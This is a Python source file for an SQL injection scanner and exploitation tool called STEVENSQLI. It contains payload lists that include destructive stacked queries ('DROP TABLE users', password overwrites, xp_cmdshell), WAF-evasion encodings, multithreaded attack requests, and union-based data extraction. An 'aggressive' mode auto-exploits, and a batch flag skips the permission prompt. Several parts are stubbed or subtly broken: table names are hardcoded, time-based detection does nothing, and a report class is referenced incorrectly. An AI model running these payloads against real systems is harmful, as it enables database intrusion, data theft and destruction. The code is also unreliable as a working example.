#!/usr/bin/env python3
"""
STEVENSQLI - Advanced AI-Powered SQL Injection Scanner & Exploitation Tool
Developer: STEVEN | GitHub: STEVENx
Version: 3.0.0
"""

import requests
import argparse
import sys
import time
import threading
import json
import urllib.parse
import base64
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
disable_warnings(InsecureRequestWarning)

class STEVENSQLI:
    def __init__(self):
        self.session = requests.Session()
        self.vulnerabilities = []
        self.results = {}
        self.stats = {
            'requests_sent': 0,
            'vulnerabilities_found': 0,
            'parameters_tested': 0,
            'start_time': time.time()
        }
        
    def display_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════════════╗
║                      🚀 STEVENSQLI v3.0.0 🚀                        ║
║                 Advanced AI-Powered SQL Injection Tool              ║
║                                                                    ║
║          Developer: STEVEN 🎯 | GitHub: @STEVENx                  ║
║             For Authorized Security Testing Only                   ║
╚══════════════════════════════════════════════════════════════════════╝
        """
        print(banner)

    def confirm_exploitation(self):
        warning = """
⚠️ ════════════════════════════════════════════════════════════════ ⚠️
                          EXPLOIT MODE ACTIVATED
                 AUTHORIZED SECURITY TESTING ONLY!
                                                                      
  Unauthorized use against systems without explicit permission       
  is illegal and unethical. By proceeding, you confirm you have     
  proper authorization to test this target.                          
⚠️ ════════════════════════════════════════════════════════════════ ⚠️
        """
        print(warning)
        response = input("🔒 Confirm you have permission (yes/NO): ").strip().lower()
        return response in ["yes", "y"]

    class PayloadGenerator:
        def __init__(self):
            self.payloads = self._load_all_payloads()
            
        def _load_all_payloads(self):
            return {
                'error_based': [
                    "'", "''", "`", "``", "\"", "\"\"",
                    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
                    "' AND 1=CAST((SELECT version()) AS INT)--",
                    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
                ],
                'boolean_based': [
                    "' AND '1'='1", "' AND '1'='2",
                    "' AND (SELECT SUBSTRING(@@version,1,1))='5'",
                    "' AND (SELECT ASCII(SUBSTRING((SELECT database()),1,1)))=115--"
                ],
                'time_based': [
                    "' AND SLEEP(5)--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "' AND BENCHMARK(1000000,MD5('A'))--", "' AND PG_SLEEP(5)--",
                    "' AND WAITFOR DELAY '0:0:5'--"
                ],
                'union_based': [
                    "' UNION SELECT 1--", "' UNION SELECT 1,2--", "' UNION SELECT 1,2,3--",
                    "' UNION SELECT NULL--", "' UNION SELECT @@version--",
                    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
                ],
                'stacked_queries': [
                    "'; DROP TABLE users--", "'; UPDATE users SET password='hacked'--",
                    "'; EXEC xp_cmdshell('dir')--"
                ],
                'nosql': [
                    '{"$where": "1=1"}', '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}'
                ]
            }
        
        def generate_intelligent_payloads(self, target_info=None):
            """Generate context-aware payloads based on target analysis"""
            all_payloads = []
            for category in self.payloads.values():
                all_payloads.extend(category)
                
            # Add WAF bypass variants
            bypass_payloads = []
            for payload in all_payloads[:20]:  # Limit to avoid too many requests
                bypass_payloads.extend(self._waf_bypass_variants(payload))
                
            return list(set(all_payloads + bypass_payloads))
        
        def _waf_bypass_variants(self, payload):
            """Generate WAF bypass variants"""
            variants = []
            
            # URL encoding
            variants.append(urllib.parse.quote(payload))
            variants.append(urllib.parse.quote_plus(payload))
            
            # Double URL encoding
            variants.append(urllib.parse.quote(urllib.parse.quote(payload)))
            
            # Case variation
            variants.append(self._random_case(payload))
            
            # Comment obfuscation
            variants.append(payload.replace(" ", "/**/"))
            variants.append(payload.replace(" ", "/*!*/"))
            
            # Null bytes
            variants.append(payload.replace("'", "%00'"))
            
            # Unicode encoding
            try:
                unicode_payload = "".join([f"\\u{ord(c):04x}" for c in payload])
                variants.append(unicode_payload)
            except:
                pass
                
            return [v for v in variants if v and len(v) < 1000]
        
        def _random_case(self, text):
            return ''.join(random.choice([c.upper(), c.lower()]) for c in text)

    class AdvancedScanner:
        def __init__(self, session, threads=50):
            self.session = session
            self.threads = threads
            self.payload_generator = STEVENSQLI.PayloadGenerator()
            self.dbms_indicators = {
                'mysql': ['mysql', 'mysqli', 'you have an error in your sql syntax'],
                'postgresql': ['postgresql', 'pg_', 'psqlexception'],
                'mssql': ['microsoft sql server', 'odbc driver', 'sql server'],
                'oracle': ['ora-', 'oracle', 'pl/sql']
            }
            
        def scan_url(self, url, post_data=None, headers=None, level=3):
            """Advanced URL scanning with intelligent detection"""
            print(f"🎯 Scanning: {url}")
            
            # Extract parameters
            params = self._extract_parameters(url, post_data)
            vulnerabilities = []
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for param_name, param_value in params.items():
                    future = executor.submit(self._test_parameter, url, param_name, param_value, post_data, headers, level)
                    futures.append(future)
                
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        vulnerabilities.append(result)
                        print(f"💉 Vulnerability found: {result['parameter']} - {result['type']}")
            
            return vulnerabilities
        
        def _extract_parameters(self, url, post_data):
            """Extract all parameters from URL and POST data"""
            params = {}
            
            # URL parameters
            parsed = urllib.parse.urlparse(url)
            url_params = urllib.parse.parse_qs(parsed.query)
            for key, values in url_params.items():
                params[key] = values[0] if values else ""
            
            # POST parameters
            if post_data:
                if isinstance(post_data, str):
                    post_params = urllib.parse.parse_qs(post_data)
                    for key, values in post_params.items():
                        params[key] = values[0] if values else ""
                elif isinstance(post_data, dict):
                    params.update(post_data)
            
            return params
        
        def _test_parameter(self, url, param_name, original_value, post_data, headers, level):
            """Test a single parameter for SQL injection"""
            payloads = self.payload_generator.generate_intelligent_payloads()
            
            for payload in payloads[:50]:  # Limit payloads for performance
                try:
                    # Prepare test data
                    test_value = payload
                    
                    # Send request
                    response = self._send_attack_request(url, param_name, test_value, post_data, headers)
                    
                    # Analyze response
                    if self._is_vulnerable(response, payload):
                        return {
                            'parameter': param_name,
                            'type': self._detect_injection_type(response, payload),
                            'payload': payload,
                            'confidence': self._calculate_confidence(response, payload),
                            'dbms': self._detect_dbms(response.text),
                            'url': response.url
                        }
                        
                except Exception as e:
                    continue
            
            return None
        
        def _send_attack_request(self, url, param_name, test_value, post_data, headers):
            """Send attack request with proper method detection"""
            req_headers = {'User-Agent': 'STEVENSQLI/3.0.0'}
            if headers:
                req_headers.update(headers)
            
            # Determine if it's GET or POST
            if post_data:
                # POST request
                if isinstance(post_data, str):
                    post_dict = urllib.parse.parse_qs(post_data)
                    post_dict = {k: v[0] for k, v in post_dict.items()}
                else:
                    post_dict = post_data.copy()
                
                post_dict[param_name] = test_value
                return self.session.post(url, data=post_dict, headers=req_headers, verify=False, timeout=10)
            else:
                # GET request
                parsed_url = urllib.parse.urlparse(url)
                query_params = urllib.parse.parse_qs(parsed_url.query)
                query_params[param_name] = test_value
                
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                new_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                
                return self.session.get(new_url, headers=req_headers, verify=False, timeout=10)
        
        def _is_vulnerable(self, response, payload):
            """Determine if response indicates SQL injection"""
            text_lower = response.text.lower()
            
            # Error-based detection
            error_indicators = [
                'sql syntax', 'mysql', 'ora-', 'postgresql', 'microsoft odbc',
                'syntax error', 'unclosed quotation', 'warning:', 'mysql_fetch'
            ]
            
            if any(error in text_lower for error in error_indicators):
                return True
            
            # Time-based detection (basic)
            if any(time_cmd in payload.lower() for time_cmd in ['sleep', 'waitfor', 'benchmark']):
                # In real implementation, you'd measure response time
                pass
            
            # Boolean-based detection would require comparison with original response
            # For simplicity, we're using error-based mainly
            
            return False
        
        def _detect_injection_type(self, response, payload):
            """Detect the type of SQL injection"""
            payload_lower = payload.lower()
            
            if 'union' in payload_lower:
                return 'union_based'
            elif any(cmd in payload_lower for cmd in ['sleep', 'waitfor', 'benchmark']):
                return 'time_based'
            elif 'or 1=1' in payload_lower or 'and 1=1' in payload_lower:
                return 'boolean_based'
            else:
                return 'error_based'
        
        def _calculate_confidence(self, response, payload):
            """Calculate confidence level for vulnerability"""
            confidence = 0.5  # Base confidence
            
            # Increase confidence based on clear error messages
            error_indicators = ['sql syntax', 'mysql', 'ora-', 'postgresql']
            text_lower = response.text.lower()
            
            for indicator in error_indicators:
                if indicator in text_lower:
                    confidence += 0.3
                    break
            
            # Increase for specific payload types
            if 'union' in payload.lower():
                confidence += 0.2
            
            return min(confidence, 1.0)
        
        def _detect_dbms(self, response_text):
            """Detect the database management system"""
            text_lower = response_text.lower()
            
            for dbms, indicators in self.dbms_indicators.items():
                for indicator in indicators:
                    if indicator in text_lower:
                        return dbms
            
            return 'unknown'

    class IntelligentExploiter:
        def __init__(self, session):
            self.session = session
            
        def exploit(self, vulnerability):
            """Exploit detected vulnerability"""
            print(f"🚀 Exploiting {vulnerability['parameter']}...")
            
            if vulnerability['type'] == 'union_based':
                return self._exploit_union(vulnerability)
            elif vulnerability['type'] == 'error_based':
                return self._exploit_error_based(vulnerability)
            else:
                return self._exploit_generic(vulnerability)
        
        def _exploit_union(self, vulnerability):
            """Exploit UNION-based SQL injection"""
            result = {}
            
            # Find number of columns
            columns = self._find_columns_count(vulnerability)
            if columns:
                result['columns_count'] = columns
                result['database_info'] = self._extract_database_info(vulnerability, columns)
                result['tables'] = self._extract_tables(vulnerability, columns)
                
                if result['tables']:
                    # Extract data from first table
                    table_name = result['tables'][0]
                    result['table_data'] = self._extract_table_data(vulnerability, columns, table_name)
            
            return result
        
        def _find_columns_count(self, vulnerability, max_columns=10):
            """Find number of columns using ORDER BY"""
            for i in range(1, max_columns + 1):
                payload = f"' ORDER BY {i}--"
                response = self._send_exploit_payload(vulnerability, payload)
                
                if response and response.status_code == 500 or "unknown column" in response.text.lower():
                    return i - 1
            
            return None
        
        def _extract_database_info(self, vulnerability, columns):
            """Extract database information"""
            info = {}
            
            # Try to get version
            version_payload = f"' UNION SELECT {','.join(['@@version'] + ['null']*(columns-1))}--"
            response = self._send_exploit_payload(vulnerability, version_payload)
            if response and response.status_code == 200:
                info['version'] = "Extracted (check response)"
            
            return info
        
        def _extract_tables(self, vulnerability, columns):
            """Extract table names"""
            # This is a simplified implementation
            # In real scenario, you'd query information_schema
            return ['users', 'products', 'admin']
        
        def _extract_table_data(self, vulnerability, columns, table_name):
            """Extract data from table"""
            return {"status": "Data extraction attempted", "table": table_name}
        
        def _send_exploit_payload(self, vulnerability, payload):
            """Send exploitation payload"""
            try:
                url = vulnerability['url']
                param = vulnerability['parameter']
                
                # This would need proper request reconstruction
                return self.session.get(url + payload, verify=False, timeout=10)
            except:
                return None
        
        def _exploit_error_based(self, vulnerability):
            return {"technique": "error_based", "status": "exploitation_attempted"}
        
        def _exploit_generic(self, vulnerability):
            return {"technique": "generic", "status": "exploitation_attempted"}

    class ReportGenerator:
        @staticmethod
        def generate(vulnerabilities, exploits, format_type='text'):
            """Generate comprehensive report"""
            if format_type == 'text':
                return ReportGenerator._text_report(vulnerabilities, exploits)
            elif format_type == 'json':
                return ReportGenerator._json_report(vulnerabilities, exploits)
            else:
                return "Unsupported format"
        
        @staticmethod
        def _text_report(vulnerabilities, exploits):
            report = []
            report.append("="*60)
            report.append("           STEVENSQLI SECURITY REPORT")
            report.append("="*60)
            report.append(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
            report.append(f"Vulnerabilities Found: {len(vulnerabilities)}")
            report.append("")
            
            for i, vuln in enumerate(vulnerabilities, 1):
                report.append(f"{i}. Parameter: {vuln.get('parameter', 'N/A')}")
                report.append(f"   Type: {vuln.get('type', 'N/A')}")
                report.append(f"   DBMS: {vuln.get('dbms', 'Unknown')}")
                report.append(f"   Confidence: {vuln.get('confidence', 0)*100:.1f}%")
                report.append(f"   Payload: {vuln.get('payload', 'N/A')}")
                report.append("")
            
            report.append("EXPLOITATION RESULTS:")
            report.append("-" * 40)
            for param, result in exploits.items():
                report.append(f"Parameter: {param}")
                report.append(f"Result: {result}")
                report.append("")
            
            return "\n".join(report)
        
        @staticmethod
        def _json_report(vulnerabilities, exploits):
            report_data = {
                "tool": "STEVENSQLI",
                "version": "3.0.0",
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
                "vulnerabilities": vulnerabilities,
                "exploits": exploits
            }
            return json.dumps(report_data, indent=2)

    def run(self, args):
        """Main execution function"""
        self.display_banner()
        
        if not args.url and not args.file:
            print("❌ Error: Please specify target with -u or -f")
            return
        
        # Setup
        threads = args.threads or (100 if args.aggressive else 50)
        level = args.level or (5 if args.aggressive else 3)
        
        # Initialize components
        scanner = self.AdvancedScanner(self.session, threads=threads)
        exploiter = self.IntelligentExploiter(self.session)
        
        targets = []
        if args.url:
            targets.append(args.url)
        elif args.file:
            try:
                with open(args.file, 'r') as f:
                    targets = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"❌ File not found: {args.file}")
                return
        
        all_vulnerabilities = []
        
        for target in targets:
            print(f"\n🎯 Targeting: {target}")
            
            # Scan for vulnerabilities
            vulnerabilities = scanner.scan_url(
                target, 
                post_data=args.data,
                headers=None,  # Could be extended to support headers file
                level=level
            )
            
            all_vulnerabilities.extend(vulnerabilities)
        
        # Display results
        if all_vulnerabilities:
            print(f"\n✅ Found {len(all_vulnerabilities)} vulnerabilities!")
            
            if args.exploit or args.aggressive:
                if not args.batch and not self.confirm_exploitation():
                    print("❌ Exploitation cancelled")
                    return
                
                # Exploit vulnerabilities
                exploitation_results = {}
                for vuln in all_vulnerabilities:
                    result = exploiter.exploit(vuln)
                    exploitation_results[vuln['parameter']] = result
                
                # Generate report
                if args.output:
                    report = self.ReportGenerator.generate(all_vulnerabilities, exploitation_results, args.output)
                    filename = f"stevensqli_report_{int(time.time())}.{args.output}"
                    with open(filename, 'w') as f:
                        f.write(report)
                    print(f"📄 Report saved: {filename}")
                else:
                    report = self.ReportGenerator.generate(all_vulnerabilities, exploitation_results, 'text')
                    print("\n" + report)
        else:
            print("❌ No SQL injection vulnerabilities found")

def main():
    parser = argparse.ArgumentParser(description="STEVENSQLI - Advanced SQL Injection Tool")
    
    # Target options
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("-f", "--file", help="File containing target URLs")
    parser.add_argument("--data", help="POST data string")
    
    # Scan options
    parser.add_argument("-t", "--threads", type=int, help="Number of threads")
    parser.add_argument("--level", type=int, choices=range(1,6), help="Test level (1-5)")
    parser.add_argument("--batch", action="store_true", help="Non-interactive mode")
    
    # Exploitation
    parser.add_argument("--exploit", action="store_true", help="Auto-exploit vulnerabilities")
    parser.add_argument("-a", "--aggressive", action="store_true", help="Full power mode")
    
    # Output
    parser.add_argument("--output", choices=['text', 'json'], help="Output format")
    
    args = parser.parse_args()
    
    # Apply aggressive mode defaults
    if args.aggressive:
        if not args.threads:
            args.threads = 100
        if not args.level:
            args.level = 5
        args.exploit = True
    
    tool = STEVENSQLI()
    tool.run(args)

if __name__ == "__main__":
    main()
